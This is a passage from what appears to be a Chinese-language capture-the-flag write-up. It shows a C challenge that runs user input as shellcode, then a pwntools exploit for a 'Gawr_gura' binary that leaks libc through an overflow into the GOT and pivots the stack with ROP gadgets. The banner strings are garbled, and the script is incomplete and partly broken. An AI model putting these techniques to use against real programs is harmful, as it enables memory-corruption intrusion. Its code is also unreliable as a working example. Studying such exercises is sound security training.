	puts("漶???????????潳▼???潳踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹猾ㄓ漶????潳滹滹手ㄣ??????滹踱ㄦ滹氯ˉ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ潳售ˉ滹踱ㄦ滹撾ˋ漶踱?潳?);
	puts("漶??????????漶???????潳領Ⅶ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱▼滹猾???????═???潳售ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱??潳?);
	puts("漶?滹ㄕ?????潳?????????潳詹??ˋ漶??賤??????????????????晦??潳詹ˋ滹踱ˋ滹踱Ⅶ滹踱ˋ滹踱潳踱ˋ滹踱▼潳踱ˋ滹踱ˋ滹踱▼??潳９");
	puts("漶１滹踱ˋ????潳售＊?????????潳詹??滹踱?????????????????????潳嫖?滹撾ˋ滹踱ˋ漶潳踱ˋ漶?滹潑ˋ滹領ˋ滹踱ˋ滹踱ˋ漶????潳?);
	puts("滹猾ˇ滹踱?????漶潑??????????潳詹??滹踱??????????????????????潳喇ˋ滹踱ˋ滹踱???滹踱ㄖ滹氯ˋ滹踱ˋ滹踱ˋ滹踱ˋ漶踱?????潳?);
	puts("滹踱ˋ滹踱ㄦ漶???詹?????????滹▲???漶??????????????????????潳詹ˋ滹踱ˋ漶??滹潑ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱??????滹?);
	puts("滹踱ˋ滹踱▼??滹??領ㄦ滹?????潳售▼????漶??????????????????????潳詹??領ˉ?晦??滹踱ˋ滹踱?滹踱ˋ滹踱ˋ滹踱???????滹?);
	puts("漶踱???潳漶???????嗯?滹滹踱?????潳????????????????????潳滹氯ˋ??漶踱??????漶??領ˋ滹踱ˋ?????漶?潳?);
	puts("漶???漶???????????漶????????手?????????????滹滹ㄓ??潳詹ˋ??詹????????????詹Ⅶ滹踱????滹氯ˋ滹ㄧ");
	puts("滹把?滹滹潑?滹滹滹滹滹滹滹滹滹滹滹滹滹詹ㄓ滹手?滹滹滹潑?滹滹?滹滹滹ㄓ滹手ㄥ滹嗯ㄥ滹踱?滹?滹?滹滹滹潑ˋ滹手ㄕ滹潑ㄕ滹滹滹滹滹滹滹滹滹氯ㄔ滹手ㄜ滹猾ㄓ滹手ˇ滹踱ˋ滹踱ˋ");
}

int main()
{
	init();
	banner();
	char ans[4], squeak[] = "pekopekopekopekopekopekopekopekopekopekopekopekopekopekopekopeko";

	puts("I think pekora is the best VTuber. Isn't it?");
	scanf("%3s", ans);

	if (strncmp(ans, "yes", 3))
	{
		puts("poor guy....");
		exit(0);
	}
	else
		puts("You will pass the course.");

	init_seccomp();

	read(0, squeak, 64);

	int i;

	for (i = 0; i < 64; i++)
	{
		if (i % 11 == 5 && squeak[i] != '\x87')
		{
			exit(0);
		}
	}

	void (*func)() = (void (*)())squeak;
	(*func)();

	return 0;
}
```

</details>

**key concept :** <font color = #FF0080 > libc base、Stack pivoting </font>

**突破點 :**

(Goal 1)取的libc base：
1. 因為 Gawr_gura.note 長度為 10，但我們可以輸入 48個字元，而且第40-48的char會剛好會覆覆蓋到GOT table中的stdout，所以我們先算好輸入長度，將stdout		前填滿，再printf Gawr_gura.note 就可以得到 stdout的 libc地址。(因為printf		內部機制是讀取null作為	停止，所以如果我們都填滿的話，就會連同後面的值一併印出)
2. 有libc 地址就能算出libc base的長度。
3. 在輸入 buf 那邊有 overflow，將 ret 的位置填入「main + 0」重新在跑一次。

(Goal 2)Stack pivoting : 
1. Gawr_gura.note 填入execve 的 ROP gadget
2. buf overflow的地方，將rbp → 填入Gawr_gura.note 的位置，
    ret → 填入leave ret 的gadget，就完成 stack pivoiting.
中間要將systcall寫入 got table中但我們還未做出來。

payload
```python
#!/usr/bin/python3
# -*- coding: UTF-8 -*-
from pwn import *
# context.arch = 'amd64' #設定目標機的資訊
# lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process('gawr_gura_distribute/share/gawr_gura')  # 檔名

pause()
p.send(b'5')  # send 5 (Input)
pause()
p.send(b'a'*0x2c)  # send msg (Input into note)
pause()
p.send(b'6')  # send get msg send 6 (show address)

stdout = u64(p.recvuntil('Write')[7794:7800].ljust(8, b'\x00'))
base = stdout - lib.sym['_IO_2_1_stdout_']
syscalls = base + lib.sym['__libc_system']
success('base: 0x%x', base)
success('total: 0x%x', syscalls)

pause()

p.send(b"a"*0x50 +  # Suggest (overwrite) back to main
       p64(0x0000000000000000) +
       p64(0x0000000000401639))
pause()
p.send(b'5')  # send 5 (Input)
pause()
pop_rdi = 0x00000000004018c3
ret = 0x000000000040101a
pop_rsp = 0x00000000004018bd
sh = base + 0xe6c84

# send msg (Input into note overwrite Got table)
p.send(b'a'*0x2c+p64(syscalls))
pause()
p.send(b'1')  # send 1 (print name)
pause()
p.send(b"a"*0x50 +  # Suggest (stack pivoiting)
       p64(0x0000000000407090) +
       p64(0x0000000000401637))

p.interactive()
```
